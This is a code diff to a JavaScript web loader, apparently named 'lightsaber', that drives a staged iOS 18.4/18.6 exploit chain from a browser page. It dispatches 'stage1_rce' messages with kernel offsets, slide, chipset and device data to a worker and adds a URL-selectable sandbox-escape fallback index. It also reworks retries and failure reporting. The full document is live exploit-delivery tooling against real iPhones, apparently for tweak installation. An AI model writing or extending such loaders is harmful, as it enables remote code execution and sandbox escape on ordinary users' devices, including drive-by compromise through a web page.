@@ -57,8 +57,17 @@ try {
     globalThis.__ls_sbc_hide_labels = 0;
     globalThis.__ls_mgpatcher_mode = 'enable';
 }
+try {
+    var __lsParams4 = new URLSearchParams(location.search || '');
+    var __sbx0FallbackStart = parseInt(__lsParams4.get('sbx0_fallback_start'), 10);
+    if (!isFinite(__sbx0FallbackStart)) __sbx0FallbackStart = 0;
+    __sbx0FallbackStart %= 4;
+    if (__sbx0FallbackStart < 0) __sbx0FallbackStart += 4;
+    globalThis.__ls_sbx0_fallback_start = __sbx0FallbackStart;
+} catch (e) { globalThis.__ls_sbx0_fallback_start = 0; }
 var basePrefix = location.pathname.startsWith('/lightsaber/') ? '/lightsaber' : '';
 var localHost = location.origin + basePrefix;
+var __ls_terminal_sent = false;
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
     console.log(out);
@@ -91,6 +100,8 @@ function print(x, reportError = false, dumphex = false) {
 }
 function redirect()
 {
+    if (__ls_terminal_sent) return;
+    __ls_terminal_sent = true;
     try { sessionStorage.removeItem('ls_running'); } catch(e) {}
     // Use '*' as targetOrigin to match upstream DarkSword. location.origin
     // would silently drop the message if the iframe's computed origin
@@ -98,6 +109,15 @@ function redirect()
     // mismatch, etc.) - we'd rather always deliver the done signal than
     // sometimes leave the parent waiting on its 60s setTimeout fallback.
     try { window.parent.postMessage({ type: 'lightsaber_done' }, '*'); } catch (e) {}
+}
+function fail(reason)
+{
+    if (__ls_terminal_sent) return;
+    __ls_terminal_sent = true;
+    let text = reason ? String(reason) : 'Unknown loader failure';
+    print("FAIL: " + text, true);
+    try { sessionStorage.removeItem('ls_running'); } catch(e) {}
+    try { window.parent.postMessage({ type: 'lightsaber_failed', reason: text }, '*'); } catch (e) {}
 }
 function getJS(fname,method = 'GET')
 {
@@ -189,6 +209,11 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         const origin = location.origin;
         print("Origin: " + origin);
         const worker = new Worker(workerBlobUrl);
+        worker.onerror = function(e) {
+            const msg = (e.message || e) + " at " + (e.filename || '?') + ":" + (e.lineno || '?');
+            print("WORKER ERROR: " + msg, true);
+            fail("Worker error: " + msg);
+        };
         print("Worker created");
         const dlopen_workers = [];
         async function prepare_dlopen_workers() {
@@ -302,6 +327,11 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 }
                 break;
             }
+            case 'stage1_failed':
+            {
+                fail("Stage1 failed: " + (data.error || "unknown error"));
+                break;
+            }
             default:
             {
                 print("[MSG] Unknown message type: " + data.type);
@@ -337,88 +367,30 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         print("desiredHost = " + desiredHost);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
-                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy'));
+                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
                     randomValues,
-                    SERVER_LOG
+                    SERVER_LOG,
+                    sbx0_fallback_start: globalThis.__ls_sbx0_fallback_start || 0
                 });
             }
             else
             {
-                print("Starting check_attempt (iOS 18.4 path)");
+                print("Starting check_attempt (iOS 18.4 path), sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
         var attempt = new check_attempt();
-        attempt.start().then((result) => {
-            if(!result)
-            {
-               // print("Retrying");
-                attempt.start().then((result) => {
-                    if(!result)
-                    {
-                        attempt.start().then((result) => {
-                            if(!result)
-                            {
-                                attempt.start().then((result) => {
-                                    if(!result)
-                                    {
-                                        attempt.start().then((result) => {
-                                            if(!result)
-                                               print("");
-                                            else
-                                            {
-                                                worker.postMessage({
-                                                type: 'stage1',
-                                                begin,
-                                                origin,
-                                                ios_version,
-                                                offsets,
-                                                slide,
-                                                chipset,
-                                                device_model,
-                                                desiredHost,
-                                                SERVER_LOG
-                                                });
-                                            }
-                                        });
-                                    }
-                                    else
-                                    {
-                                        worker.postMessage({
-                                        type: 'stage1',
-                                        begin,
-                                        origin,
-                                        ios_version,
-                                        offsets,
-                                        slide,
-                                        chipset,
-                                        device_model,
-                                        desiredHost,
-                                        SERVER_LOG
-                                        });
-                                    }
-                                });
-                            }
-                            else
-                            {
-                                worker.postMessage({
-                                type: 'stage1',
-                                begin,
-                                origin,
-                                ios_version,
-                                offsets,
-                                slide,
-                                chipset,
-                                device_model,
-                                desiredHost,
-                                SERVER_LOG
-                                });
-                            }
-                        });
-                    }
-                    else
-                            {
-                        worker.postMessage({
+        (async function() {
+            var maxRetries = 5;
+            for (var retryIdx = 0; retryIdx < maxRetries; retryIdx++) {
+                if (retryIdx > 0) {
+                    print("check_attempt retry " + retryIdx + "/" + maxRetries);
+                    await new Promise(function(r) { setTimeout(r, 100); });
+                }
+                var result = false;
+                try { result = await attempt.start(); } catch(e) { print("check_attempt threw: " + e); }
+                if (result) {
+                    worker.postMessage({
                         type: 'stage1',
                         begin,
                         origin,
@@ -428,33 +400,21 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         chipset,
                         device_model,
                         desiredHost,
-                        SERVER_LOG
-                });
-                            }
-                        });
-                    }
-                    else
-                    {
-                        //WebViewComptability(attempt, iframe);
-            worker.postMessage({
-                type: 'stage1',
-                begin,
-                origin,
-                ios_version,
-                offsets,
-                slide,
-                chipset,
-                device_model,
-                desiredHost,
-                SERVER_LOG
-            });
-                    }
-        });
+                        SERVER_LOG,
+                        sbx0_fallback_start: globalThis.__ls_sbx0_fallback_start || 0
+                    });
+                    return;
+                }
+            }
+            print("All " + maxRetries + " check_attempt retries exhausted", true);
+            fail("All " + maxRetries + " check_attempt retries exhausted");
+        })();
             }
         }
         catch(e)
         {
             print("Got exception on something: " + e, true);
+            fail("Loader exception: " + e);
         }
     }
     main();
